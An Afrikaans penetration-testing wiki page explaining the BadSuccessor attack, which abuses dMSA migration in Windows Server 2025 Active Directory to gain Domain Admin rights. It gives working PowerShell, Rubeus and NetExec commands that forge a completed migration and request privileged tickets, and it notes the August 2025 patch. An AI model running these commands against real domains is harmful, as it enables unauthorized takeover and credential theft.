# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

**BadSuccessor** misbruik die **delegated Managed Service Account** (**dMSA**)-migrasiewerkvloei wat in **Windows Server 2025** bekendgestel is. ’n dMSA kan aan ’n legacy-rekening gekoppel word deur **`msDS-ManagedAccountPrecededByLink`** en deur die migrasietoestande beweeg wat in **`msDS-DelegatedMSAState`** gestoor word. Indien ’n aanvaller ’n dMSA in ’n skryfbare OU kan skep en daardie attribute kan beheer, kan die KDC tickets vir die aanvaller-beheerde dMSA uitreik met die **authorization context van die gekoppelde rekening**.<sup>[[2]](#references)</sup>

In die praktyk beteken dit dat ’n gebruiker met lae privileges wat slegs gedelegeerde OU-regte het, ’n nuwe dMSA kan skep, dit na `Administrator` kan laat wys, die migrasietoestand kan voltooi, en dan ’n TGT kan verkry waarvan die PAC bevoorregte groepe soos **Domain Admins** bevat.<sup>[[2]](#references)</sup>

## dMSA-migrasiebesonderhede wat saak maak

- dMSA is ’n **Windows Server 2025**-feature.
- `Start-ADServiceAccountMigration` stel die migrasie op die **started**-toestand.
- `Complete-ADServiceAccountMigration` stel die migrasie op die **completed**-toestand.
- `msDS-DelegatedMSAState = 1` beteken migrasie is begin.
- `msDS-DelegatedMSAState = 2` beteken migrasie is voltooi.
- Tydens ’n wettige migrasie is die dMSA bedoel om die superseded rekening deursigtig te vervang, sodat die KDC/LSA toegang behou wat die vorige rekening reeds gehad het.<sup>[[3]](#references)</sup>

Microsoft Learn merk ook op dat die oorspronklike rekening tydens migrasie aan die dMSA gekoppel word en dat die dMSA bedoel is om toegang te verkry tot dit waartoe die ou rekening toegang gehad het.<sup>[[3]](#references)</sup> Dit is die security-aanname wat BadSuccessor misbruik.<sup>[[2]](#references)</sup>

## Vereistes

1. ’n Domain waar **dMSA bestaan**, wat beteken dat **Windows Server 2025**-ondersteuning aan die AD-kant teenwoordig is.
2. Die aanvaller kan `msDS-DelegatedManagedServiceAccount`-objects in ’n OU **create**, of het ekwivalente breë child-object creation-regte daar.
3. Die aanvaller kan die relevante dMSA-attributes **write**, of het volle beheer oor die dMSA wat pas geskep is.
4. Die aanvaller kan Kerberos-tickets versoek vanuit ’n domain-joined context of vanaf ’n tunnel wat LDAP/Kerberos bereik.<sup>[[2]](#references)</sup>

### Praktiese checks

Die duidelikste operateursein is om die domain/forest-vlak te verifieer en te bevestig dat die omgewing reeds die nuwe Server 2025-stack gebruik:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
As jy waardes soos `Windows2025Domain` en `Windows2025Forest` sien, behandel **BadSuccessor / dMSA migration abuse** as ’n prioriteitskontrole.

Jy kan ook skryfbare OUs wat vir dMSA creation gedelegeer is, met public tooling enumereer:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Misbruikvloei

1. Create 'n dMSA in 'n OU waar jy delegated create-child rights het.
2. Stel **`msDS-ManagedAccountPrecededByLink`** op die DN van 'n privileged target soos `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Stel **`msDS-DelegatedMSAState`** op `2` om die migration as completed te merk.
4. Request 'n TGT vir die nuwe dMSA en gebruik die returned ticket om toegang tot privileged services te verkry.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Voorbeelde van Ticket request / operational tooling:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Waarom dit meer as privilege escalation is

Tydens 'n legitieme migration het Windows ook die nuwe dMSA nodig om tickets te hanteer wat voor cutover vir die vorige account uitgereik is. Daarom kan dMSA-verwante ticketmateriaal **huidige** en **vorige** keys insluit in die **`KERB-DMSA-KEY-PACKAGE`** flow.<sup>[[2]](#references)</sup>

Vir 'n attacker-beheerde vals migration kan hierdie gedrag BadSuccessor omskep in:<sup>[[2]](#references)</sup>

- **Privilege escalation** deur bevoorregte groep-SIDs in die PAC te erf.
- **Blootstelling van credential-materiaal**, omdat die hantering van previous keys in kwesbare workflows materiaal kan blootlê wat gelykstaande is aan die voorganger se RC4/NT hash.

Dit maak die technique nuttig vir sowel direkte domain takeover as opvolgaksies soos pass-the-hash of breër credential compromise.

## Aantekeninge oor patch-status

Die oorspronklike BadSuccessor-gedrag is **nie net 'n teoretiese 2025-preview-kwessie nie**. Microsoft het dit **CVE-2025-53779** toegeken en 'n security update in **Augustus 2025** gepubliseer.<sup>[[4]](#references)</sup> Hou hierdie attack gedokumenteer vir:

- **labs / CTFs / assume-breach-oefeninge**
- **unpatched Windows Server 2025-omgewings**
- **validasie van OU-delegations en dMSA exposure tydens assessments**

Moenie aanvaar dat 'n Windows Server 2025-domain kwesbaar is net omdat dMSA bestaan nie; verifieer die patch level en toets versigtig.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Verwysings

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
